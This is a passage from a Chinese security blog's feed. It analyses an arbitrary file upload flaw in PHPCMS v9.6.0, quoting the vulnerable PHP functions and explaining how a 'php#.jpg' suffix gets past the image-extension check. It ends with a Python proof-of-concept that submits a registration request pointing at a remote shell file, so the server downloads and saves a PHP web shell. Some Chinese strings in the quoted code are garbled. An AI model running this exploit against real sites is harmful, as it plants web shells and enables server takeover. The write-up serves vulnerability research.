class="string">'minlength'</span>];</span><br><span class="line">$maxlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'maxlength'</span>];</span><br><span class="line">$pattern = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'pattern'</span>];</span><br><span class="line">$errortips = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'errortips'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($errortips)) $errortips = <span class="string">"$name ������Ҫ��"</span>;</span><br><span class="line">$length = <span class="keyword">empty</span>($value) ? <span class="number">0</span> : strlen($value);</span><br><span class="line"><span class="keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="string">"$name �������� $minlength ���ַ���"</span>);</span><br><span class="line"><span class="keyword">if</span> (!array_key_exists($field, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">'ģ���в�����'</span>.$field.<span class="string">'�ֶ�'</span>);</span><br><span class="line"><span class="keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123;</span><br><span class="line">showmessage(<span class="string">"$name ���ó��� $maxlength ���ַ���"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">str_cut($value, $maxlength);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'isunique'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="string">'edit'</span>) showmessage(<span class="string">"$name ��ֵ�����ظ���"</span>);</span><br><span class="line">$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line"></span><br><span class="line">$info[$field] = $value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>参数传入：<br>首先经过 trim_script 函数， 过滤掉script和iframe<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trim_script</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">$str = preg_replace ( <span class="string">'/\&lt;([\/]?)script([^\&gt;]*?)\&gt;/si'</span>, <span class="string">'&amp;lt;\\1script\\2&amp;gt;'</span>, $str );</span><br><span class="line">$str = preg_replace ( <span class="string">'/\&lt;([\/]?)iframe([^\&gt;]*?)\&gt;/si'</span>, <span class="string">'&amp;lt;\\1iframe\\2&amp;gt;'</span>, $str );</span><br><span class="line">$str = preg_replace ( <span class="string">'/\&lt;([\/]?)frame([^\&gt;]*?)\&gt;/si'</span>, <span class="string">'&amp;lt;\\1frame\\2&amp;gt;'</span>, $str );</span><br><span class="line">$str = preg_replace ( <span class="string">'/]]\&gt;/si'</span>, <span class="string">']] &gt;'</span>, $str );</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再经过safe_replace 函数，过滤特殊字符<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string); <span class="comment">// 空格</span></span><br><span class="line">$string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string); <span class="comment">// 单引号</span></span><br><span class="line">$string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string); <span class="comment">// 双重编码</span></span><br><span class="line">$string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string); </span><br><span class="line">$string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string); </span><br><span class="line">$string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string); </span><br><span class="line">$string = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$string);  </span><br><span class="line">$string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</span><br><span class="line">$string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</span><br><span class="line">$string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</span><br><span class="line">$string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</span><br><span class="line">$string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</span><br><span class="line">$string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</span><br><span class="line"><span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br></pre></td></tr></table></figure><p><img src="/phpcms_v9.6.0 任意文件上传.resources/7AD3B062-8D57-4659-8362-E8E0651D552F.png" alt="a2c24d4398d5221982a1cfa140d52d79"></p><p>ediotr 方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">$setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</span><br><span class="line">$enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'spider_img'</span>])) $enablesaveimage = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($enablesaveimage) &#123;</span><br><span class="line">$site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</span><br><span class="line">$watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</span><br><span class="line">$value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>$value = $this-&gt;attachment-&gt;download(‘content’, $value, $watermark_enable);</p><p>传入的被带入download函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $image_d;</span><br><span class="line"><span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</span><br><span class="line">$upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;field = $field;</span><br><span class="line">$dir = date(<span class="string">'Y/md/'</span>);</span><br><span class="line">$uploadpath = $upload_url.$dir;</span><br><span class="line">$uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">$string = new_stripslashes($value);</span><br><span class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</span><br><span class="line">$remotefileurls = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">dir_create($uploaddir);</span><br><span class="line">$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($matches, $string);</span><br><span class="line">$remotefileurls = array_unique($remotefileurls);</span><br><span class="line">$oldpath = $newpath = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">$filename = fileext($file);</span><br><span class="line">$file_name = basename($file);</span><br><span class="line">$filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">$newfile = $uploaddir.$filename;</span><br><span class="line">$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line"><span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</span><br><span class="line">$oldpath[] = $k;</span><br><span class="line">$GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">@chmod($newfile, <span class="number">0777</span>);</span><br><span class="line">$fileext = fileext($filename);</span><br><span class="line"><span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">&#125;</span><br><span class="line">$filepath = $dir.$filename;</span><br><span class="line">$downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">$aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line"><span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>waf：</p><blockquote><p>if(!preg_match_all(“/(href|src)=([\”|’]?)([^ \”‘&gt;]+.($ext))\2/i”, $string, $matches)) return $value;</p></blockquote><p>后缀：$ext = ‘gif|jpg|jpeg|bmp|png’<br>使用 php#.jpg 绕过</p><p>进入到 fillurl 函数<br>在 301 行去掉了 #</p><blockquote><p>\$pos = strpos($surl,’#’);</p></blockquote><p>$remotefileurls = <a href="http://url/shell.php" target="_blank" rel="noopener">http://url/shell.php</a></p><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p><img src="/phpcms_v9.6.0 任意文件上传.resources/2DD865E1-9D37-4837-9F17-2421D3523708.png" alt="1192bc6a47731354afb36b986b5dc6a6"></p><h2 id="0x03-POC"><a href="#0x03-POC" class="headerlink" title="0x03 POC"></a>0x03 POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018-12-20 22:57</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: file_writein_poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/phpcms_V9.6.0/install_package/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1'</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">'siteid'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'modelid'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">'test'</span>,</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'testxx'</span>,</span><br><span class="line">        <span class="string">'email'</span>: <span class="string">'test@test.com'</span>,</span><br><span class="line">        <span class="string">'info[content]'</span>: <span class="string">'&lt;img src=http://url/shell.txt?.php#.jpg&gt;'</span>,</span><br><span class="line">        <span class="string">'dosubmit'</span>: <span class="string">'1'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">poc = requests.post(url,data= data)</span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞分析&quot;&gt;&lt;a href=&quot;#0x01-漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞分析&quot;&gt;&lt;/a&gt;0x01 漏洞分析&lt;/h2&gt;&lt;p&gt;漏洞 url：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http:
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>About</title>
    <link href="http://patrilic.top/2019/04/01/Hello/"/>
    <id>http://patrilic.top/2019/04/01/Hello/</id>
    <published>2019-04-01T03:20:33.000Z</published>
    <updated>2019-05-04T16:53:55.887Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Welcome-To-My-Blog"><a href="#Welcome-To-My-Blog" class="headerlink" title="Welcome To My Blog~"></a>Welcome To My Blog~</h3><p>A Security Lover ❤️</p><h4 id="Red-Team-Web-Security-Pentestration-Coding"><a href="#Red-Team-Web-Security-Pentestration-Coding" class="headerlink" title="Red-Team, Web Security , Pentestration , Coding"></a>Red-Team, Web Security , Pentestration , Coding</h4><p><strong>Love: @Moc17a</strong></p><p>Wechat:</p><p><img src="/Contact/Wx_qr.png" alt="Wx_Code"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Welcome-To-My-Blog&quot;&gt;&lt;a href=&quot;#Welcome-To-My-Blog&quot; class=&quot;headerlink&quot; title=&quot;Welcome To My Blog~&quot;&gt;&lt;/a&gt;Welcome To My Blog~&lt;/h3&gt;&lt;p&gt;A Se
      
    
    </summary>
    
    
  </entry>
  
</feed>
